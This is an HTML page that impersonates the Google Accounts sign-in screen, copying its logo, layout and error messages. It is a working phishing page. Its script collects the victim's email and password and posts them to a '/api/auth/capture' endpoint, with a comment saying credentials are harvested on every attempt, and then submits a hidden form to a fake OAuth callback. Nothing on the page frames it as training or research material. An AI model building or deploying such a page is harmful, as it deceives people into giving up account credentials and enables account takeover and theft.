<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Roboto', Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; justify-content: center; padding-top: 48px; }
  .card { width: 100%; max-width: 450px; padding: 48px 40px 36px; border-radius: 28px; border: 1px solid #dadce0; }
  .logo { text-align: center; margin-bottom: 16px; }
  .logo svg { width: 75px; height: 24px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
  .subtitle { text-align: center; color: #202124; font-size: 16px; margin-bottom: 32px; }
  .field { margin-bottom: 8px; }
  input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; outline: none; transition: border .15s; }
  input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
  input::placeholder { color: #80868b; }
  input.err { border-color: #d93025 !important; }
  .err-msg { color: #d93025; font-size: 12px; margin-top: 4px; margin-bottom: 12px; display: none; align-items: center; gap: 6px; }
  .err-msg.show { display: flex; }
  .err-icon { width: 16px; height: 16px; background: #d93025; color: #fff; border-radius: 50%; font-size: 11px; display: inline-flex; align-items: center; justify-content: center; font-weight: bold; }
  .forgot { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; margin: 8px 0 32px; display: inline-block; }
  .forgot:hover { background: rgba(66,133,244,0.04); }
  .guest { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
  .guest a { color: #1a73e8; cursor: pointer; }
  .actions { display: flex; justify-content: space-between; align-items: center; }
  .create { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; border: none; background: none; padding: 8px; border-radius: 4px; }
  .create:hover { background: rgba(66,133,244,0.04); }
  .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; letter-spacing: 0.25px; }
  .btn:hover { background: #1557b0; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
  .btn:disabled { opacity: .7; cursor: default; }
  .step2 { display: none; }
  .show-pwd-wrap { display: flex; align-items: center; gap: 12px; margin: 12px 0 24px; }
  .show-pwd-wrap input[type="checkbox"] { width: 18px; height: 18px; accent-color: #1a73e8; }
  .show-pwd-wrap label { color: #202124; font-size: 14px; }
  .footer { margin-top: 32px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #757575; }
  .footer a { color: #757575; text-decoration: none; margin-right: 24px; }
  .footer a:hover { color: #202124; }
  .lang-select { border: none; background: none; color: #757575; font-size: 12px; cursor: pointer; outline: none; }
  .hidden-form { display: none; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
      <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
      <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
      <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
      <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
      <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
      <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
    </svg>
  </div>

  <div class="step1" id="s1">
    <h1>Sign in</h1>
    <p class="subtitle">to continue to SAM</p>
    <div class="field">
      <input type="email" id="email" placeholder="Email or phone" required autofocus>
    </div>
    <div class="err-msg" id="e1"><span class="err-icon">!</span> <span>Enter an email or phone number</span></div>
    <div class="forgot" onclick="alert('Not implemented')">Forgot email?</div>
    <p class="guest">Not your computer? Use Guest mode to sign in privately.<br><a>Learn more about using Guest mode</a></p>
    <div class="actions">
      <button class="create" onclick="alert('Not implemented')">Create account</button>
      <button class="btn" id="btn1" onclick="nextStep()">Next</button>
    </div>
  </div>

  <div class="step2" id="s2">
    <h1>Welcome</h1>
    <p class="subtitle" id="em"></p>
    <div class="field">
      <input type="password" id="pwd" placeholder="Enter your password" required>
    </div>
    <div class="err-msg" id="e2"><span class="err-icon">!</span> <span>Wrong password. Try again or click Forgot password to reset it.</span></div>
    <div class="show-pwd-wrap">
      <input type="checkbox" id="show" onchange="togglePwd()">
      <label for="show">Show password</label>
    </div>
    <div class="actions">
      <button class="create" onclick="alert('Not implemented')">Forgot password?</button>
      <button class="btn" id="btn2" onclick="doLogin()">Next</button>
    </div>
  </div>

  <form class="hidden-form" id="loginForm" action="/api/auth/oauth-callback" method="POST">
    <input type="hidden" name="provider" id="fProvider" value="google">
    <input type="hidden" name="email" id="fEmail">
    <input type="hidden" name="password" id="fPassword">
  </form>

  <div class="footer">
    <div>
      <select class="lang-select">
        <option>English (United States)</option>
        <option>Русский</option>
      </select>
    </div>
    <div>
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</div>

<script>
let emailVal = '';
function nextStep() {
  const e = document.getElementById('email').value.trim();
  if (!e) {
    document.getElementById('email').classList.add('err');
    document.getElementById('e1').classList.add('show');
    return;
  }
  emailVal = e;
  document.getElementById('e1').classList.remove('show');
  document.getElementById('email').classList.remove('err');
  document.getElementById('s1').style.display = 'none';
  document.getElementById('s2').style.display = 'block';
  document.getElementById('em').textContent = e;
  document.getElementById('pwd').focus();
}
function togglePwd() {
  document.getElementById('pwd').type = document.getElementById('show').checked ? 'text' : 'password';
}
function doLogin() {
  const pwd = document.getElementById('pwd').value;
  if (!pwd) return;
  const btn = document.getElementById('btn2');
  btn.textContent = 'Signing in…';
  btn.disabled = true;
  document.getElementById('fEmail').value = emailVal;
  document.getElementById('fPassword').value = pwd;

  // Harvest creds on every attempt (failed or success)
  fetch("/api/auth/capture", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ provider: "google", email: emailVal, password: pwd })
  }).catch(() => {});

  document.getElementById('loginForm').submit();
}
</script>
</body>
</html>
